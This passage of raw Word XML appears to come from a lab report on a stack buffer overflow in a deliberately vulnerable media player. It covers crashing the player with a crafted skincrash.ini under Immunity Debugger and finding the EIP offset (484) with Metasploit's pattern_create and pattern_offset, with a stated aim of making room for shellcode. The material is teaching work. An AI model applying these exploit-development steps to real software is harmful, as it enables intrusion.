      <w:r w:rsidR="008A26FF" w:rsidRPr="008A26FF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix B1</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve"> See the comments in Appendix B1 for a line-by-line breakdown.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA8B2B2" w14:textId="78300089" w:rsidR="00162D59" w:rsidRDefault="003B2BA8" w:rsidP="00356068">
      <w:r>
        <w:t>Open this file and another will appear named</w:t>
      </w:r>
      <w:r w:rsidR="00162D59">
        <w:t xml:space="preserve"> “skincrash.ini” as defined in the first line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of crash1.pl</w:t>
      </w:r>
      <w:r w:rsidR="00162D59">
        <w:t xml:space="preserve">. This is the file that </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">needs to be uploaded </w:t>
      </w:r>
      <w:r w:rsidR="00162D59">
        <w:t>to the media player running through Immunity Debugger.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E0BA5B" w14:textId="0157CC6D" w:rsidR="00162D59" w:rsidRDefault="00162D59" w:rsidP="00356068">
      <w:r>
        <w:t>This</w:t>
      </w:r>
      <w:r w:rsidR="003B2BA8">
        <w:t xml:space="preserve"> is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> done by right-clicking on the </w:t>
      </w:r>
      <w:r w:rsidR="006274C0">
        <w:t xml:space="preserve">running </w:t>
      </w:r>
      <w:r>
        <w:t>media player</w:t>
      </w:r>
      <w:r w:rsidR="00907D69">
        <w:t>, then going to [</w:t>
      </w:r>
      <w:r>
        <w:t>Options -&gt; Skin -&gt; Open</w:t>
      </w:r>
      <w:r w:rsidR="00907D69">
        <w:t xml:space="preserve">] and then selecting the skincrash.ini from the menu that appears. </w:t>
      </w:r>
      <w:r w:rsidR="006274C0">
        <w:t>Which, if opened, w</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>ill</w:t>
      </w:r>
      <w:r w:rsidR="006274C0">
        <w:t xml:space="preserve"> crash the program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EAE75A" w14:textId="28BA3A45" w:rsidR="006274C0" w:rsidRDefault="00907D69" w:rsidP="006274C0">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:object w:dxaOrig="15165" w:dyaOrig="7230" w14:anchorId="2A9C62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2.85pt;height:234.25pt" o:ole="">
            <v:imagedata r:id="rId15" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1025" DrawAspect="Content" ObjectID="_1714027407" r:id="rId16"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C460C5" w14:textId="69D9E7BE" w:rsidR="00162D59" w:rsidRDefault="00907D69" w:rsidP="00907D69">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Opening the skincrash.ini file from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>VulnPlayer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7053C1" w14:textId="14AD130D" w:rsidR="006274C0" w:rsidRPr="006274C0" w:rsidRDefault="006274C0" w:rsidP="006274C0">
      <w:r>
        <w:t>Taking a look at the CPU - Main Thread screen reveal</w:t>
      </w:r>
      <w:r w:rsidR="003B2BA8">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the exact line that the program crashed at</w:t>
      </w:r>
      <w:r w:rsidR="00CD7D4F">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00CD7D4F" w:rsidRPr="003B2BA8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 5</w:t>
      </w:r>
      <w:r w:rsidR="00CD7D4F" w:rsidRPr="009C7442">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="009C7442">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> displaying it to be location </w:t>
      </w:r>
      <w:r w:rsidRPr="009C7442">
        <w:t>0011BEA8</w:t>
      </w:r>
      <w:r>
        <w:t>, with the content AAAA, which comes from the skincrash.ini file as expected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220F27B1" w14:textId="77777777" w:rsidR="006274C0" w:rsidRDefault="00907D69" w:rsidP="006274C0">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AE4DD5B" wp14:editId="522940D0">
            <wp:extent cx="3454519" cy="60605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1356" cy="607256"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB0441C" w14:textId="0E19C4CB" w:rsidR="00907D69" w:rsidRDefault="006274C0" w:rsidP="006274C0">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Output from the debug scree</w:t>
      </w:r>
      <w:r w:rsidRPr="00090631">
        <w:t>n.</w:t>
      </w:r>
      <w:r w:rsidRPr="00090631">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> See Appendix A1 for the full output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5DD7D2" w14:textId="549737CB" w:rsidR="00F8417D" w:rsidRDefault="00972ED7" w:rsidP="00162D59">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc103326460"/>
      <w:r>
        <w:t>Finding and Testing the EIP offset</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="77F1EA05" w14:textId="61903CFB" w:rsidR="00CD7D4F" w:rsidRDefault="00CD7D4F" w:rsidP="00CD7D4F">
      <w:r>
        <w:t>In order to exploit this crash, the EIP offset first ha</w:t>
      </w:r>
      <w:r w:rsidR="008C133D">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be found</w:t>
      </w:r>
      <w:r w:rsidR="000F78CA">
        <w:t xml:space="preserve">. This offset </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">determines the </w:t>
      </w:r>
      <w:r w:rsidR="000F78CA">
        <w:t>distance from the start of the stack to the location of the EIP Register (Figure 6), which could be modified to point towards executable code</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBAF56D" w14:textId="77777777" w:rsidR="000F78CA" w:rsidRDefault="000F78CA" w:rsidP="000F78CA">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:object w:dxaOrig="3780" w:dyaOrig="1350" w14:anchorId="6752C0FE">
          <v:shape id="_x0000_i1026" type="#_x0000_t75" style="width:287.1pt;height:103pt" o:ole="">
            <v:imagedata r:id="rId18" o:title=""/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_i1026" DrawAspect="Content" ObjectID="_1714027408" r:id="rId19"/>
        </w:object>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B10DEA0" w14:textId="4033324B" w:rsidR="000F78CA" w:rsidRDefault="000F78CA" w:rsidP="000F78CA">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - EIP contents when skincrash.ini was used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9064CD" w14:textId="7C85AF34" w:rsidR="000F78CA" w:rsidRDefault="000F78CA" w:rsidP="000F78CA">
      <w:r>
        <w:t>To calculate the offset,</w:t>
      </w:r>
      <w:r w:rsidR="008C133D">
        <w:t xml:space="preserve"> open</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="001077CD">
        <w:t xml:space="preserve"> Metasploit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tool </w:t>
      </w:r>
      <w:r w:rsidR="001077CD">
        <w:t xml:space="preserve">“pattern_create.exe” in the Windows command prompt </w:t>
      </w:r>
      <w:r w:rsidR="008C133D">
        <w:t>and enter the following command</w:t>
      </w:r>
      <w:r w:rsidR="001077CD">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050EAA75" w14:textId="032504D1" w:rsidR="001077CD" w:rsidRDefault="001077CD" w:rsidP="000F78CA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="36A03EA7" wp14:editId="5666DB27">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1597025</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2552700" cy="307975"/>
                <wp:effectExtent l="0" t="0" r="19050" b="158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307975"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="4A3D63B6" w14:textId="7B8A1532" w:rsidR="001077CD" w:rsidRDefault="001077CD" w:rsidP="00C464E6">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                            </w:pPr>
                            <w:r>
                              <w:t>pattern_create</w:t>
                            </w:r>
                            <w:r w:rsidR="00C464E6">
                              <w:t>.exe</w:t>
                            </w:r>
                            <w:r>
                              <w:t xml:space="preserve"> 3000&gt;3000offset.txt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A03EA7" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Text Box 2" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:125.75pt;margin-top:0;width:201pt;height:24.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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="4A3D63B6" w14:textId="7B8A1532" w:rsidR="001077CD" w:rsidRDefault="001077CD" w:rsidP="00C464E6">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                      <w:r>
                        <w:t>pattern_create</w:t>
                      </w:r>
                      <w:r w:rsidR="00C464E6">
                        <w:t>.exe</w:t>
                      </w:r>
                      <w:r>
                        <w:t xml:space="preserve"> 3000&gt;3000offset.txt</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="3963301D" w14:textId="5AD32212" w:rsidR="008A26FF" w:rsidRDefault="008A26FF" w:rsidP="000F78CA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7008D376" wp14:editId="47DEC57C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>574040</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>94615</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4869180" cy="635"/>
                <wp:effectExtent l="0" t="0" r="7620" b="0"/>
                <wp:wrapSquare wrapText="bothSides"/>
                <wp:docPr id="15" name="Text Box 15"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4869180" cy="635"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5FB40549" w14:textId="52C2DD9E" w:rsidR="001077CD" w:rsidRPr="0024080A" w:rsidRDefault="001077CD" w:rsidP="001077CD">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>6</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - pattern_create usage, the 3000 determines how many characters it took to crash the program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08D376" id="Text Box 15" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:45.2pt;margin-top:7.45pt;width:383.4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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="5FB40549" w14:textId="52C2DD9E" w:rsidR="001077CD" w:rsidRPr="0024080A" w:rsidRDefault="001077CD" w:rsidP="001077CD">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>6</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - pattern_create usage, the 3000 determines how many characters it took to crash the program</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="38104E62" w14:textId="3DFE2B62" w:rsidR="00BE46D3" w:rsidRDefault="00BE46D3" w:rsidP="000F78CA"/>
    <w:p w14:paraId="06DF14CE" w14:textId="197FE120" w:rsidR="00BE46D3" w:rsidRDefault="00BE46D3" w:rsidP="000F78CA">
      <w:r>
        <w:t xml:space="preserve">This file </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>will appear</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the same folder</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve"> as the pattern_create.exe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and its contents </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>should</w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t xml:space="preserve"> be </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">copied and pasted into the $buffer function of the crash1.pl file from earlier after removing the “x3000” from it. </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>Run crash1.pl again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF27469" w14:textId="51292516" w:rsidR="00BE46D3" w:rsidRPr="00090631" w:rsidRDefault="00305636" w:rsidP="00305636">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00090631">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>See Appendix A2 for a screenshot of the contents of crash1.pl at this point.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268342F6" w14:textId="45D0EBEA" w:rsidR="00BE46D3" w:rsidRPr="00BE46D3" w:rsidRDefault="00BE46D3" w:rsidP="00BE46D3">
      <w:r>
        <w:t>Run</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the Vulnerable Media Player through Immunity again and upload </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>the updated crash1.ini</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exactly which part of the $buffer function the program crashes at</w:t>
      </w:r>
      <w:r w:rsidR="00D60DCB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C464E6">
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00D60DCB">
        <w:t>2Aq3</w:t>
      </w:r>
      <w:r w:rsidR="00C464E6">
        <w:t xml:space="preserve"> or</w:t>
      </w:r>
      <w:r w:rsidR="00D60DCB">
        <w:t xml:space="preserve"> 71413171</w:t>
      </w:r>
      <w:r w:rsidR="00C464E6">
        <w:t xml:space="preserve"> in little endian notation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. From here, the distance from the start of the stack to the EIP </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve">can be calculated </w:t>
      </w:r>
      <w:r>
        <w:t>using “pattern_offset.exe”</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F0C3F2" w14:textId="77777777" w:rsidR="00D60DCB" w:rsidRDefault="00814049" w:rsidP="00D60DCB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FF70140" wp14:editId="292B42A7">
            <wp:extent cx="3106951" cy="193512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1203" cy="1937773"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB6CC85" w14:textId="7D42364F" w:rsidR="00BE46D3" w:rsidRDefault="00D60DCB" w:rsidP="00D60DCB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00305636">
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - crash output from the updated skincrash.ini file, showing the EIP location and the part of the string that caused the crash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702A76D9" w14:textId="386AF760" w:rsidR="00305636" w:rsidRDefault="009C7442" w:rsidP="00305636">
      <w:r>
        <w:t>Open</w:t>
      </w:r>
      <w:r w:rsidR="00305636">
        <w:t xml:space="preserve"> ‘pattern_offset.exe</w:t>
      </w:r>
      <w:r>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidR="00305636">
        <w:t xml:space="preserve">. This tool </w:t>
      </w:r>
      <w:r w:rsidR="0095710F">
        <w:t>requires</w:t>
      </w:r>
      <w:r w:rsidR="00305636">
        <w:t xml:space="preserve"> the number of characters</w:t>
      </w:r>
      <w:r w:rsidR="0095710F">
        <w:t xml:space="preserve"> in</w:t>
      </w:r>
      <w:r w:rsidR="00305636">
        <w:t xml:space="preserve"> the crash file (3000) and the part of the </w:t>
      </w:r>
      <w:r w:rsidR="00C464E6">
        <w:t xml:space="preserve">EIP value at the time of the crash (71413171)(Figure </w:t>
      </w:r>
      <w:r w:rsidR="00085E66">
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00C464E6">
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E77ADC" w14:textId="593FAEDA" w:rsidR="00C464E6" w:rsidRDefault="00C464E6" w:rsidP="00305636">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251668480" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="30D2A154" wp14:editId="25D0AE2D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1790700</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>64770</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2317750" cy="307975"/>
                <wp:effectExtent l="0" t="0" r="25400" b="1587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0" cy="307975"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="428A3DD8" w14:textId="47163853" w:rsidR="00C464E6" w:rsidRDefault="00C464E6" w:rsidP="00C464E6">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:t>pattern_offset.exe 71413171 3000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2A154" id="_x0000_s1028" type="#_x0000_t202" style="position:absolute;margin-left:141pt;margin-top:5.1pt;width:182.5pt;height:24.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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="428A3DD8" w14:textId="47163853" w:rsidR="00C464E6" w:rsidRDefault="00C464E6" w:rsidP="00C464E6">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:t>pattern_offset.exe 71413171 3000</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DF95F3" w14:textId="5821CF94" w:rsidR="00C464E6" w:rsidRDefault="00C464E6" w:rsidP="00C464E6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251670528" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="06668428" wp14:editId="35747A9E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1600200</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>144145</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2771775" cy="635"/>
                <wp:effectExtent l="0" t="0" r="9525" b="0"/>
                <wp:wrapSquare wrapText="bothSides"/>
                <wp:docPr id="6" name="Text Box 6"/>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14:paraId="78D528D3" w14:textId="5F0E8C5E" w:rsidR="00C464E6" w:rsidRPr="00631959" w:rsidRDefault="00C464E6" w:rsidP="00C464E6">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>7</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - pattern_offset usage in the command prompt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668428" id="Text Box 6" o:spid="_x0000_s1029" type="#_x0000_t202" style="position:absolute;margin-left:126pt;margin-top:11.35pt;width:218.2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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="78D528D3" w14:textId="5F0E8C5E" w:rsidR="00C464E6" w:rsidRPr="00631959" w:rsidRDefault="00C464E6" w:rsidP="00C464E6">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>7</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - pattern_offset usage in the command prompt</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="032D0CF6" w14:textId="5C2250AB" w:rsidR="00C464E6" w:rsidRDefault="00C464E6" w:rsidP="00305636"/>
    <w:p w14:paraId="7A202B0E" w14:textId="5D01CBC4" w:rsidR="009A01B1" w:rsidRDefault="00C464E6" w:rsidP="009A01B1">
      <w:r>
        <w:t xml:space="preserve">The program </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>will then display a number</w:t>
      </w:r>
      <w:r>
        <w:t>, 484</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve"> in this case</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, revealing that to be the distance. </w:t>
      </w:r>
      <w:r w:rsidR="00D01D16">
        <w:t xml:space="preserve">Now, rather than using 3000 characters to crash the program (which was only a rough estimate to provide a proof of concept) it </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00D01D16">
        <w:t xml:space="preserve"> possible to change the $buffer function from before to only use 484 A’s, as that </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00D01D16">
        <w:t xml:space="preserve"> the minimum required to crash the program (</w:t>
      </w:r>
      <w:r w:rsidR="005E1F6C" w:rsidRPr="00090631">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Appendix B2</w:t>
      </w:r>
      <w:r w:rsidR="00D01D16">
        <w:t xml:space="preserve">), giving more room for shellcode. </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>Append a new line after the A’s</w:t>
      </w:r>
      <w:r w:rsidR="009A01B1">
        <w:t>, “BBBB”</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve"> using the “$buffer .= “XXXX” format from before.</w:t>
      </w:r>
      <w:r w:rsidR="005E1F6C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t xml:space="preserve">This will </w:t>
      </w:r>
      <w:r w:rsidR="009A01B1">
        <w:t xml:space="preserve">prove whether the offset was calculated correctly and if the program was trying to execute </w:t>
      </w:r>
      <w:r w:rsidR="005E1F6C">
